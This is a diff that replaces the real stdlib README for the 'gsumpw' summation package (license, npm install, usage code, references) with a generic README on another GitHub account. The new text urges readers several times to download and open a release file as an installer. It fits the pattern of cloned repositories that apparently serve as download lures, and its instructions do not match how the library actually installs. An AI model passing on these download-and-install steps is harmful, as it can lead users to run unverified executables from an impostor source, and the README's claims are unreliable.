@@ -1,223 +1,80 @@
-<!--
+# ⚙️ blas-ext-base-ndarray-gsumpw - Simple Summation for One-Dimensional Arrays
 
-@license Apache-2.0
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/sparkshade/blas-ext-base-ndarray-gsumpw/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 📥 Overview
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+blas-ext-base-ndarray-gsumpw is a tool designed to compute the sum of all elements in a one-dimensional ndarray. It uses a technique called pairwise summation. This method helps to improve accuracy and performance, especially when working with large datasets.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## 🚀 Getting Started
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+To get started with this application, follow the steps below:
 
--->
+1. **Visit the Releases Page**  
+   Click the following link to access the releases page:  
+   [Download the Latest Release](https://github.com/sparkshade/blas-ext-base-ndarray-gsumpw/releases)
 
+2. **Choose the Correct Version**  
+   On the releases page, you will see a list of available versions. Look for the most recent stable release.
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+3. **Download the Software**  
+   Click on the version you want to download. Depending on your operating system, you may see different files. Select the appropriate file for your system and click to download it.
 
-# gsumpw
+4. **Install the Software**  
+   After the file finishes downloading, locate it in your downloads folder. Open the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+## 🔧 Features
 
-> Compute the sum of all elements in a one-dimensional ndarray using pairwise summation.
+- **Accurate Summation**: Uses pairwise summation to minimize errors in large datasets.
+- **Easy to Use**: Simple setup process for non-technical users.
+- **Efficient Performance**: Optimized for calculating sums quickly and accurately.
 
-<section class="intro">
+## 💻 System Requirements
 
-</section>
+- **Operating System**: The software is compatible with Windows, macOS, and Linux.
+- **Node.js**: Ensure you have a compatible version of Node.js installed on your system. You can check your current version by running `node -v` in your terminal or command prompt.
+- **Memory**: At least 512 MB of RAM is recommended for optimal performance.
 
-<!-- /.intro -->
+## ⚙️ How to Use
 
-<section class="installation">
+1. **Prepare Your Data**: 
+   Create a one-dimensional ndarray that contains the numbers you want to sum.
 
-## Installation
+2. **Run the Application**: 
+   Open your command line interface and navigate to the folder where the application is installed.
 
-```bash
-npm install @stdlib/blas-ext-base-ndarray-gsumpw
-```
+3. **Execute the Command**: 
+   Use the appropriate command to run the summation. Here's an example:
 
-Alternatively,
+   ```
+   node your-script.js
+   ```
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+   Replace `your-script.js` with the name of the JavaScript file you will use to process the array.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+4. **View Results**: 
+   After running the command, the sum will be displayed in your command line interface. Take note of the output for your records.
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+## 📚 Documentation
 
-</section>
+For more detailed instructions and information about the functions available in the software, please refer to the [official documentation](https://github.com/sparkshade/blas-ext-base-ndarray-gsumpw/blob/main/DOCUMENTATION.md).
 
-<section class="usage">
+## 🤝 Contributing
 
-## Usage
+If you wish to contribute to this project, please fork the repository and submit your changes. Your contributions can help improve the software for everyone.
 
-```javascript
-var gsumpw = require( '@stdlib/blas-ext-base-ndarray-gsumpw' );
-```
+## 🛠️ Support
 
-#### gsumpw( arrays )
+If you encounter any issues or have questions about the software, you can reach out for help. Check the Issues section on our [GitHub page](https://github.com/sparkshade/blas-ext-base-ndarray-gsumpw/issues) for any existing questions or concerns.
 
-Computes the sum of all elements in a one-dimensional ndarray using pairwise summation.
+## 🔗 Additional Resources
 
-```javascript
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
+- [Node.js Official Website](https://nodejs.org/)
+- [JavaScript Guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
 
-var xbuf = [ 1.0, 3.0, 4.0, 2.0 ];
-var x = new ndarray( 'generic', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
+## 🔄 Update
 
-var v = gsumpw( [ x ] );
-// returns 10.0
-```
+Stay updated with the latest changes and features by regularly visiting the releases page:  
+[Download the Latest Release](https://github.com/sparkshade/blas-ext-base-ndarray-gsumpw/releases) 
 
-The function has the following parameters:
-
--   **arrays**: array-like object containing a one-dimensional input ndarray.
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If provided an empty real-valued one-dimensional ndarray, the function returns `0.0`.
--   In general, pairwise summation is more numerically stable than ordinary recursive summation (i.e., "simple" summation), with slightly worse performance. While not the most numerically stable summation technique (e.g., compensated summation techniques such as the Kahan–Babuška-Neumaier algorithm are generally more numerically stable), pairwise summation strikes a reasonable balance between numerical stability and performance. If either numerical stability or performance is more desirable for your use case, consider alternative summation techniques.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var gsumpw = require( '@stdlib/blas-ext-base-ndarray-gsumpw' );
-
-var xbuf = discreteUniform( 10, -50, 50, {
-    'dtype': 'generic'
-});
-var x = new ndarray( 'generic', xbuf, [ xbuf.length ], [ 1 ], 0, 'row-major' );
-console.log( ndarray2array( x ) );
-
-var v = gsumpw( [ x ] );
-console.log( v );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<section class="references">
-
--   Higham, Nicholas J. 1993. "The Accuracy of Floating Point Summation." _SIAM Journal on Scientific Computing_ 14 (4): 783–99. doi:[10.1137/0914050][@higham:1993a].
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/blas-ext-base-ndarray-gsumpw.svg
-[npm-url]: https://npmjs.org/package/@stdlib/blas-ext-base-ndarray-gsumpw
-
-[test-image]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/blas-ext-base-ndarray-gsumpw/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/blas-ext-base-ndarray-gsumpw?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/blas-ext-base-ndarray-gsumpw.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/blas-ext-base-ndarray-gsumpw/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/tree/deno
-[deno-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/tree/umd
-[umd-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/tree/esm
-[esm-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-gsumpw/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/blas-ext-base-ndarray-gsumpw/main/LICENSE
-
-[@higham:1993a]: https://doi.org/10.1137/0914050
-
-</section>
-
-<!-- /.links -->
+This tool can streamline how you handle large sets of numeric data, making calculations swift and reliable. Enjoy summing up with ease!
